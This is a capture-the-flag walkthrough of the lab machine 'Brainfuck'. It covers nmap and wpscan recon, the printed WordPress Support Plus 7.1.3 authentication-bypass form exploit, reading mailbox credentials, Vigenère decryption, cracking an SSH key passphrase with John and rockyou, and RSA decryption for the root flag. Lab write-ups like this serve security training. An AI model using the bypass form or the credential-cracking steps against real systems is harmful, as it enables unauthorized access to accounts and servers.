# Brainfuck

_Penetration Tester Level 3
_SSL
_Web
_Vulnerability Assessment
_Cryptography
_Outdated Software
_Authentication
_Wordpress
_Reconnaissance
_Exploit Modification
_Password Cracking
_Weak Credentials
_Information Disclosure

## Scanning

### Ping

First we ping the machine to check that we have access to it.

```
$ ping 10.10.10.17
PING 10.10.10.17 (10.10.10.17) 56(84) bytes of data.
64 bytes from 10.10.10.17: icmp_seq=1 ttl=63 time=45.9 ms
```

With the ping we can see that we the machine is recheable.
We can have some info about ttl=63.
This ttl means that we are in fton of a linux machine (ttl of linux is 64)

### Nmap


```
$ nmap -sC -sV -Pn -o nmap.txt 10.10.10.17

Nmap scan report for brainfuck.htb (10.10.10.17)
Host is up (0.059s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) TOP USER CAPA AUTH-RESP-CODE RESP-CODES UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 have OK LITERAL+ post-login listed more Pre-login capabilities SASL-IR LOGIN-REFERRALS ENABLE ID IDLE IMAP4rev1
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-alpn: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can see next avalible services:
- Ssh on port 22, OpenSSH 7.2, this is a recent version of ssh. so It's shouldn't be vulnerable.
- Email protocols (Smtp port 25, Pop3 port 110, Imap port 143). This is interesting, maybe we have to access to an email server.
- ssl/http server on port 443. It shows the domain an subdomains that we are going to add to our /etc/hosts file.

```
echo '10.10.10.17   www.brainfuck.htb sup3rs3cr3t.brainfuck.htb' >> /etc/hosts
```

### 443 Port 

We access with a navigator to:
- https://sup3rs3cr3t.brainfuck.htb
- https://brainfuck.htb
Important to check that is https protocol, cause we are using ssl.

In the sup3rs3cr3t forum we can see with the wappalyzer extension that is using a message board named Flarum

In the brainfuck.htb using wappalyzer we can see that use Wordpress 4.7.3

Looking around the both webs we can start enumerating some users and emails:
- admin
- orestis
- orestis@brainfuck.htb

### WpScan
We are goign to use this tool, cause we identified a wordpress.
The results are saved on wpscan.txt file.

```
$ wpscan --url https://brainfuck.htb/ --disable-tls-checks -e vp,u -o wpscan.txt
```

With this scan we can see that the next plugin have some vulnerabilities:
- WP Support Plus Responsive Ticket
The version is Version: 7.1.3 (80% confidence).

It identifies 2 users:
- admin
- administrator

## Gaining System Access

#### Support Plus Responsive Ticket 7.1.3

We search for an exploit for this service with searchsploit.

```
$ searchsploit Support Plus Responsive Ticket 
```

One of the result is:
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt

```
$ locate php/webapps/41006.txt
/usr/share/exploitdb/exploits/php/webapps/41006.txt
$ cat /usr/share/exploitdb/exploits/php/webapps/41006.txt
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
# Date: 10-01-2017
# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: web

1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.   
```

We edit the file to point the action to https://brainfuck.htb and we let the value of username as administrator.

After using the exploit, we can access to https://brainfuck.htb/wp-admin of the web, but we can edit few things. 
Let's try changing the username value to admin.
Looks like with admin user we have more privileges.

I triyed to upload a reverse shell, with .php5 format but it is being blocked.
Now i start searching around the Settings pannel.

- General settings:
    - orestis@brainfuck.htb
- Writing Settings:
    - mail.example.com port 110
    - login@example.com
    - password
- Reading, Discussion, permalinks
    - Nothing important
- Media
    - Organize my uploads into month- and year-based folders
- Easy WP SMTP
    - email address: orestis@brainfuck.htb
    - SMTP host: localhost
    - SMTP port: 25
    - SMTP auth: yes
    - SMTP username: orestis
    - SMTP password: looks hide with points cause is a password, but we can inspect the element, and change the type="password" to type="text". Now we can see the password. kHGuERB29DNiNE

### SMTP

```
$ telnet 10.10.10.17 110
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
+OK Dovecot ready.
user orestis
+OK
pass kHGuERB29DNiNE
+OK Logged in.
list
+OK 2 messages:
1 977
2 514

```

In the second email we can see there is a message from root@brainfuck.htb with credentials for the secret forum:
- username: orestis
- password: kIEnnfEKJ#9UmdO

Let's try to log in with this credentials.

Now we can see some new threads.

In SSH Access Orestis says at the end of a post:
```
Orestis - Hacking for fun and profit
```

In the other post named Key, looks like all is encrypted, but we can see thath in the first message, at the end says:

```
Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
```

Looks like it has the same structure, same number of words, and same numbers of letters each word.

Let's try to get the key. First we paste the diferent text found in the thread on this web, so it can analyze it and say us what is the mos probably cipher user.

It say it can be Vigenere or Beaufort cipher.

Let's try vigenère using this tool: https://rumkin.com/tools/cipher/vigenere/#

Paste 'Orestis - Hacking for fun and profit' on cypher key.
Select Operating mode as Decrypt.

And on the textbox we paste the message of the bottom -> "Qbqquzs - Pnhekxs dpi fca fhf zdmgzt"

Let's remove withespace, and other things and we get "CkmybraInfuckmybrainfuckmybra" as key.
The key looks like "fuckmybrain".
Let's  use this key to decrypt other messages.

If we decrypt the message "Si rbazmvm, Q'yq vtefc gfrkr nn ;)" with "fuckmybrain" we got "No problem, I'll brute force it ;)". This key is correct.

If we decrypt the next message we got:
```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

We got a file with a rsa key, but it is "save" under a password. Let's crack it.

### John the ripper

At this moment we have a id_rsa key that is used in the ssh service, but john works with an special format file.
There are some scripts that we can use to convert the id_rsa file to the correct format.

```
$ locate 2john
```

This will output a big amount of scripts to convert files to john format.

```
$ locate 2john | grep ssh
/usr/share/john/ssh2john.py
```
Use this script and save the output, that will be the input for the john brute force tool.
Next we use this output to crack the password using the most common wordlist, rockyou.txt.

```
$ /usr/sgare/john/ssh2john.py id_rsa > id_rsa2
$ locate rockyou.txt
/usr/share/wordlist/rockyou.txt
$ john id_rsa2 --wordlist=/usr/share/wordlist/rockyou.txt
```

If all have been done correcly, will show the password _3poulakia!_
Let's try to log in ssh.

### SSH, user flag

With the username orestis, the id_rsa file and the password for it we can login.

```
$ ssh -i id_rsa orestis@10.10.10.17
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$ whoami
orestis
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat user.txt
```

At this moment we have the user flag. Next step is the root flag.

### Root flag, RSA decrypt

In home folder of the user, near the user flag, there are 3 files:
- debug.txt: reading it with cat -e shows that we have 3 long numbers, 1 per row.
- encrypt.sage: Looks like is a script that reads the root.txt that contains the root flag, encode it to hexadecimal, then to integer and encrypts the message with: pow(m, e, n).
    - m is the root flag
    - e is the value saved on the third row of debug file.
    - n = p * q , being p the number of the first row of debug file, and q the sencond one.
- output.txt: It has the encrypted root flag

If we know about Rsa cypher we can see that it is rsa cypher, but if is the first time you see this searching some info about n = p * q encrypt will show you result about speaking about rsa.

With this online tool we can decypt the message:
https://www.tausquared.net/pages/ctf/rsa.html

Remember that the decrypted message has to be converted to hexadecimal and then to ascii.

Job done.